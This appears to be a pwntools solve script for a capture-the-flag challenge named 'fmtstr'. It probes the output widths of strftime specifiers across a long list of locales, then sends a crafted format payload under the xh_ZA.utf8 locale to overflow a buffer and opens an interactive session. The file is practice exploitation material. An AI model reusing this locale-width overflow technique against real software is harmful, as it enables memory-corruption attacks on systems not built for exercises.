#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./distribution/fmtstr", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc challs.nusgreyhats.org 31234"
    nc = "nc localhost 5000"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        if args.GDB:
            return gdb.debug(args=args_, env=env, gdbscript=gdbscript)
        return process(args_, env=env, *a, **kw)


env = {}
gdbscript = """
source ~/.gdbinit-gef-bata24.py
"""

locales = ["C", "C.utf8", "POSIX", "aa_DJ", "aa_DJ.utf8", "aa_ER", "aa_ER@saaho", "aa_ET", "af_ZA", "af_ZA.utf8", "agr_PE", "ak_GH", "am_ET", "an_ES", "an_ES.utf8", "anp_IN", "ar_AE", "ar_AE.utf8", "ar_BH", "ar_BH.utf8", "ar_DZ", "ar_DZ.utf8", "ar_EG", "ar_EG.utf8", "ar_IN", "ar_IQ", "ar_IQ.utf8", "ar_JO", "ar_JO.utf8", "ar_KW", "ar_KW.utf8", "ar_LB", "ar_LB.utf8", "ar_LY", "ar_LY.utf8", "ar_MA", "ar_MA.utf8", "ar_OM", "ar_OM.utf8", "ar_QA", "ar_QA.utf8", "ar_SA", "ar_SA.utf8", "ar_SD", "ar_SD.utf8", "ar_SS", "ar_SY", "ar_SY.utf8", "ar_TN", "ar_TN.utf8", "ar_YE", "ar_YE.utf8", "as_IN", "ast_ES", "ast_ES.utf8", "ayc_PE", "az_AZ", "az_IR", "be_BY", "be_BY.utf8", "be_BY@latin", "bem_ZM", "ber_DZ", "ber_MA", "bg_BG", "bg_BG.utf8", "bhb_IN.utf8", "bho_IN", "bho_NP", "bi_VU", "bn_BD", "bn_IN", "bo_CN", "bo_IN", "br_FR", "br_FR.utf8", "br_FR@euro", "brx_IN", "bs_BA", "bs_BA.utf8", "byn_ER", "ca_AD", "ca_AD.utf8", "ca_ES", "ca_ES.utf8", "ca_ES@euro", "ca_ES@valencia", "ca_FR", "ca_FR.utf8", "ca_IT", "ca_IT.utf8", "ce_RU", "chr_US", "ckb_IQ", "cmn_TW", "crh_UA", "cs_CZ", "cs_CZ.utf8", "csb_PL", "cv_RU", "cy_GB", "cy_GB.utf8", "da_DK", "da_DK.utf8", "de_AT", "de_AT.utf8", "de_AT@euro", "de_BE", "de_BE.utf8", "de_BE@euro", "de_CH", "de_CH.utf8", "de_DE", "de_DE.utf8", "de_DE@euro", "de_IT", "de_IT.utf8", "de_LI.utf8", "de_LU", "de_LU.utf8", "de_LU@euro", "doi_IN", "dsb_DE", "dv_MV", "dz_BT", "el_CY", "el_CY.utf8", "el_GR", "el_GR.utf8", "el_GR@euro", "en_AG", "en_AU", "en_AU.utf8", "en_BW", "en_BW.utf8", "en_CA", "en_CA.utf8", "en_DK", "en_DK.iso885915", "en_DK.utf8", "en_GB", "en_GB.iso885915", "en_GB.utf8", "en_HK", "en_HK.utf8", "en_IE", "en_IE.utf8", "en_IE@euro", "en_IL", "en_IN", "en_NG", "en_NZ", "en_NZ.utf8", "en_PH", "en_PH.utf8", "en_SC.utf8", "en_SG", "en_SG.utf8", "en_US", "en_US.iso885915", "en_US.utf8", "en_ZA", "en_ZA.utf8", "en_ZM", "en_ZW", "en_ZW.utf8", "eo", "eo_US.utf8", "es_AR", "es_AR.utf8", "es_BO", "es_BO.utf8", "es_CL", "es_CL.utf8", "es_CO", "es_CO.utf8", "es_CR", "es_CR.utf8", "es_CU", "es_DO", "es_DO.utf8", "es_EC", "es_EC.utf8", "es_ES", "es_ES.utf8", "es_ES@euro", "es_GT", "es_GT.utf8", "es_HN", "es_HN.utf8", "es_MX", "es_MX.utf8", "es_NI", "es_NI.utf8", "es_PA", "es_PA.utf8", "es_PE", "es_PE.utf8", "es_PR", "es_PR.utf8", "es_PY", "es_PY.utf8", "es_SV", "es_SV.utf8", "es_US", "es_US.utf8", "es_UY", "es_UY.utf8", "es_VE", "es_VE.utf8", "et_EE", "et_EE.iso885915", "et_EE.utf8", "eu_ES", "eu_ES.utf8", "eu_ES@euro", "eu_FR", "eu_FR.utf8", "eu_FR@euro", "fa_IR", "ff_SN", "fi_FI", "fi_FI.utf8", "fi_FI@euro", "fil_PH", "fo_FO", "fo_FO.utf8", "fr_BE", "fr_BE.utf8", "fr_BE@euro", "fr_CA", "fr_CA.utf8", "fr_CH", "fr_CH.utf8", "fr_FR", "fr_FR.utf8", "fr_FR@euro", "fr_LU", "fr_LU.utf8", "fr_LU@euro", "fur_IT", "fy_DE", "fy_NL", "ga_IE", "ga_IE.utf8", "ga_IE@euro", "gd_GB", "gd_GB.utf8", "gez_ER", "gez_ER@abegede", "gez_ET", "gez_ET@abegede", "gl_ES", "gl_ES.utf8", "gl_ES@euro", "gu_IN", "gv_GB", "gv_GB.utf8", "ha_NG", "hak_TW", "he_IL", "he_IL.utf8", "hi_IN", "hif_FJ", "hne_IN", "hr_HR", "hr_HR.utf8", "hsb_DE", "hsb_DE.utf8", "ht_HT", "hu_HU", "hu_HU.utf8", "hy_AM", "hy_AM.armscii8", "ia_FR", "id_ID", "id_ID.utf8", "ig_NG", "ik_CA", "is_IS", "is_IS.utf8", "it_CH", "it_CH.utf8", "it_IT", "it_IT.utf8", "it_IT@euro", "iu_CA", "ja_JP.eucjp", "ja_JP.utf8", "ka_GE", "ka_GE.utf8", "kab_DZ", "kk_KZ", "kk_KZ.rk1048", "kk_KZ.utf8", "kl_GL", "kl_GL.utf8", "km_KH", "kn_IN", "ko_KR.euckr", "ko_KR.utf8", "kok_IN", "ks_IN", "ks_IN@devanagari", "ku_TR", "ku_TR.utf8", "kw_GB", "kw_GB.utf8", "ky_KG", "lb_LU", "lg_UG", "lg_UG.utf8", "li_BE", "li_NL", "lij_IT", "ln_CD", "lo_LA", "lt_LT", "lt_LT.utf8", "lv_LV", "lv_LV.utf8", "lzh_TW", "mag_IN", "mai_IN", "mai_NP", "mfe_MU", "mg_MG", "mg_MG.utf8", "mhr_RU", "mi_NZ", "mi_NZ.utf8", "miq_NI", "mjw_IN", "mk_MK", "mk_MK.utf8", "ml_IN", "mn_MN", "mni_IN", "mnw_MM", "mr_IN", "ms_MY", "ms_MY.utf8", "mt_MT", "mt_MT.utf8", "my_MM", "nan_TW", "nan_TW@latin", "nb_NO", "nb_NO.utf8", "nds_DE", "nds_NL", "ne_NP", "nhn_MX", "niu_NU", "niu_NZ", "nl_AW", "nl_BE", "nl_BE.utf8", "nl_BE@euro", "nl_NL", "nl_NL.utf8", "nl_NL@euro", "nn_NO", "nn_NO.utf8", "nr_ZA", "nso_ZA", "oc_FR", "oc_FR.utf8", "om_ET", "om_KE", "om_KE.utf8", "or_IN", "os_RU", "pa_IN", "pa_PK", "pap_AW", "pap_CW", "pl_PL", "pl_PL.utf8", "ps_AF", "pt_BR", "pt_BR.utf8", "pt_PT", "pt_PT.utf8", "pt_PT@euro", "quz_PE", "raj_IN", "ro_RO", "ro_RO.utf8", "ru_RU", "ru_RU.cp1251", "ru_RU.koi8r", "ru_RU.utf8", "ru_UA", "ru_UA.utf8", "rw_RW", "sa_IN", "sah_RU", "sat_IN", "sc_IT", "sd_IN", "sd_IN@devanagari", "sd_PK", "se_NO", "sgs_LT", "shn_MM", "shs_CA", "si_LK", "sid_ET", "sk_SK", "sk_SK.utf8", "sl_SI", "sl_SI.utf8", "sm_WS", "so_DJ", "so_DJ.utf8", "so_ET", "so_KE", "so_KE.utf8", "so_SO", "so_SO.utf8", "sq_AL", "sq_AL.utf8", "sq_MK", "sr_ME", "sr_RS", "sr_RS@latin", "ss_ZA", "st_ZA", "st_ZA.utf8", "sv_FI", "sv_FI.utf8", "sv_FI@euro", "sv_SE", "sv_SE.iso885915", "sv_SE.utf8", "sw_KE", "sw_TZ", "szl_PL", "ta_IN", "ta_LK", "tcy_IN.utf8", "te_IN", "tg_TJ", "tg_TJ.utf8", "th_TH", "th_TH.utf8", "the_NP", "ti_ER", "ti_ET", "tig_ER", "tk_TM", "tl_PH", "tl_PH.utf8", "tn_ZA", "to_TO", "tpi_PG", "tr_CY", "tr_CY.utf8", "tr_TR", "tr_TR.utf8", "ts_ZA", "tt_RU", "tt_RU@iqtelif", "ug_CN", "ug_CN@latin", "uk_UA", "uk_UA.utf8", "unm_US", "ur_IN", "ur_PK", "uz_UZ", "uz_UZ.utf8", "uz_UZ@cyrillic", "ve_ZA", "vi_VN", "wa_BE", "wa_BE.utf8", "wa_BE@euro", "wae_CH", "wal_ET", "wo_SN", "xh_ZA", "xh_ZA.utf8", "yi_US", "yi_US.utf8", "yo_NG", "yue_HK", "yuw_PG", "zh_CN", "zh_CN.gb18030", "zh_CN.gbk", "zh_CN.utf8", "zh_HK", "zh_HK.utf8", "zh_SG", "zh_SG.gbk", "zh_SG.utf8", "zh_TW", "zh_TW.euctw", "zh_TW.utf8", "zu_ZA", "zu_ZA.utf8", ]  # noqa


def change_lang(lang):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"locale: ", lang)
    resp = io.recvline()
    if b"Failed" in resp:
        return False
    return True


def print_time(fmt, lang="C.utf8"):
    if change_lang(lang):
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"specifier: ", fmt)
        io.recvuntil(b"Formatted: ")
        out = io.recvline().strip()
        log.info(f"{lang.decode()} {fmt.decode()}: {len(out):#x} {out}")


s = [
    b"%P",
    b"%a",
    b"%A",
    b"%b",
    b"%B",
    b"%h",
    b"%Z",
]

# for p in s:
#     for l in locales:
#         with context.quiet:
#             io = start()
#         print_time(p, l.encode())
#         with context.quiet:
#             io.close()

locale = b"xh_ZA.utf8"

# for p in s:
#     with context.quiet:
#         io = start()
#     print_time(p, locale)
#     with context.quiet:
#         io.close()

io = start()
# %B is 0xc bytes
# %A is 0x9 bytes
# %a is 0x3 bytes
# %; is 0x2 bytes
payload = b"%B%A%a%a%;%;"  # total: 0x1f bytes
payload += b"%b"  # Tsh

print_time(payload, locale)

io.interactive()
